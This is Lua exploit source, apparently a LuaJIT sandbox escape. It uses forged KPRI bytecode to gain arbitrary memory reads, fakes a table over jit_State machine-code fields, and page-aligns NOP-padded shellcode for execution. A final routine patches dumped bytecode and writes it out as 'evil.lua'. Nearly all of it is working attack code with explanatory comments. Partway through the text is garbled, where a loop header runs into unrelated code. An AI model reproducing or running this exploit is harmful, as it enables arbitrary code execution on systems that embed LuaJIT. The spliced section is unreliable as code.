        local istr = (iaddr - 4) + 2^52
        istr = -32764 -- Turned into KPRI(str)
        local pc = s_sub(istr, 5, 8)
        istr = resync()
        pc = s_uint32(pc)
        -- The following three lines result in the local variable
        -- called "memory" being `cdata: NULL`. We can
        -- subsequently use this variable to read arbitrary memory
        -- (one byte at a time). Note again the KPRI trick to change
        -- the high 32 bits of a TValue. In this case, the low 32 bits
        -- end up pointing to the bytecode instructions at the top of
        -- this function wrapped in `if false`.
        local memory = (pc + 8) + 2^52
        memory = -32758 -- Turned into KPRI(cdata)
        memory = memory + 0
        -- Helper function to read a uint32_t from any memory location.
        local function m_uint32(offs)
          local result = 0
          for i = offs + 3, offs, -1 do
            result = result * 256 + (memory[i] % 256)
          end
          return result
        end
        -- Helper function to extract the low 32 bits of a TValue.
        -- In particular, for TValues containing a GCobj*, this gives
        -- the GCobj* as a uint32_t. Note that the two memory reads
        -- here are GCfuncL::uvptr[1] and GCupval::v.
        local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
        local function low32(tv)
          v = tv
          return m_uint32(vaddr)
        end
        -- Helper function which is the inverse of s_uint32: given a
        -- 32 bit number, returns a four byte string.
        local function ub4(n)
          local result = ""
          for i = 0, 3 do
            local b = n % 256
            n = (n - b) / 256
            result = result .. s_char(b)
            resync()
          end
          return result
        end
        -- The following four lines result in the local variable
        -- called "mctab" containing a very special table: the
        -- array part of the table points to the current Lua
        -- universe's jit_State::patchins field. Consequently,
        -- the table's [0] through [4] fields allow access to the
        -- mcprot, mcarea, mctop, mcbot, and szmcarea fields of
        -- the jit_State. Note that LuaJIT allocates the empty
        -- string within global_State, so a fixed offset from the
        -- address of the empty string gives the fields we're
        -- after within jit_State.
        local mctab_s = "\0\0\0\0\99\4\0\0".. ub4(low32("") + 2748)
          .."\0\0\0\0\0\0\0\0\0\0\0\0\5\0\0\0\255\255\255\255"
        local mctab = low32(mctab_s) + 16 + 2^52
        mctab = -32757 -- Turned into KPRI(table)
        -- Construct a string consisting of 4096 x86 NOP instructions.
        local nop4k = "\144"
        for i = 1, 12 do nop4k = nop4k .. nop4k end
        -- Create a copy of the shellcode which is page aligned, and
        -- at least one page big, and obtain its address in "asaddr".
        local ashellcode = nop4k .. shellcode .. nop4k
        local asaddr = low32(ashellcode) + 16
        asaddr = asaddr + 2^12 - (asaddr % 2^12)
        -- The following seven lines result in the memory protection of
        -- the page at asaddr changing from read/write to read/execute.
        -- This is done by setting the jit_State::mcarea and szmcarea
        -- fields to specify the page in question, setting the mctop and
        -- mcbot fields to an empty subrange of said page, and then
        -- triggering some JIT compilation. As a somewhat unfortunate
        -- side-effect, the page at asaddr is added to the jit_State's
        -- linked-list of mcode areas (the shellcode unlinks it).
        --[[
        local mcarea = mctab[1]
        --mctab[0] = 0
        mctab[0] = 0x1234/ 2^52 / 2^1022
        mctab[1] = 0x4321/ 2^52 / 2^1022
        mctab[2] = 0xdead / 2^52 / 2^1022
        mctab[3] = 0xbeef / 2^52 / 2^1022
        mctab[4] = 2^12 / 2^52 / 2^1022
        --while mctab[0] == 0 do end
        local i = 1
        while i = 128 then
        local sh = 7; v = v - 128
        repeat
          local r = p[0]
          v = v + bit.lshift(bit.band(r, 127), sh)
          sh = sh + 7
          p = p + 1
        until r < 128
      end
      return v
    end
    -- The dumped bytecode contains several prototypes: one for "evil"
    -- itself, and one for every (transitive) inner function. We step
    -- through each prototype in turn, and tweak some of them.
    while true do
      local len = read_uleb128()
      if len == 0 then break end
      local pend = p + len
      local flags, numparams, framesize, sizeuv = p[0], p[1], p[2], p[3]
      p = p + 4
      read_uleb128()
      read_uleb128()
      local sizebc = read_uleb128()
      local bc = p
      local uv = ffi.cast("uint16_t*", p + sizebc * 4)
      if numparams == 0 and sizeuv == 3 then
        -- This branch picks out the "inner" function.
        -- The first thing we do is change what the 0th upvalue
        -- points at:
        uv[0] = uv[0] + 2
        -- Then we go through and change everything which was written
        -- as "local_variable = -327XX" in the source to instead be
        -- a KPRI instruction:
        for i = 0, sizebc do
          if bc[0] == BC.KSHORT then
            local rd = ffi.cast("int16_t*", bc)[1]
            if rd <= -32749 then
              bc[0] = BC.KPRI
              bc[3] = 0
              if rd == -32749 then
                -- the `cdata = -32749` line in source also tweaks
                -- the two instructions after it:
                bc[4] = 0
                bc[8] = 0
              end
            end
          end
          bc = bc + 4
        end
      elseif sizebc == 1 then
        -- As written, the s_byte, s_char, and s_sub functions each
        -- contain a single "return" instruction. We replace said
        -- instruction with the corresponding fast-function instruction.
        bc[0] = 147 + numparams
        bc[2] = bit.band(1 + numparams, 6)
      end
      p = pend
    end
    -- Finally, save the manipulated bytecode as evil.lua:
    local f = io.open("evil.lua", "wb")
    f:write(ffi.string(buf, #estr))
    f:close()